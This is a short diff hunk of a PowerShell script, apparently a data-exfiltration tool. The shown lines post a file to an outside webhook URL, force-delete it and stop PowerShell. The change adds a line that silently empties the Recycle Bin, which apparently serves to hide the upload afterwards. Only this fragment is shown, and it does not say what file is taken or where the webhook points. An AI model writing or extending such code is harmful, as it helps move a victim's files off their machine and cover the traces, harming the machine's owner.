@@ -20,4 +20,5 @@ $bodyLines = (
 )
 Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body ($bodyLines -join "`r`n")
 Remove-Item -Path $file -Force
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 Stop-Process -Name powershell
